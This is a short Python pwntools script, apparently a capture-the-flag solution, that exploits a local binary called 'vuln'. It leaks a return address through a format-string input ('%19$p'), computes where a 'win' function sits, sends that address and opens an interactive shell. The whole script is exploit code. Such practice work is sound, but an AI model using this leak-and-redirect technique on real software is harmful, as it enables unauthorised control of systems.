
from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_offset(exe, cyclic(500))
ret_addr = 0x1441
win = elf.symbols['win']
diff = win-ret_addr
# Start program
io = start()

io.sendline(b"%19$p")  # found through fuzzying
io.recvuntil(b"name:")
real_ret = int(io.recvline()[:-1], 16)

# Build the payload
payload = flat([
    hex(real_ret+diff),
])
print(payload)
# Send the payload
io.sendlineafter(b'', payload)

# Got Shell?
io.interactive()
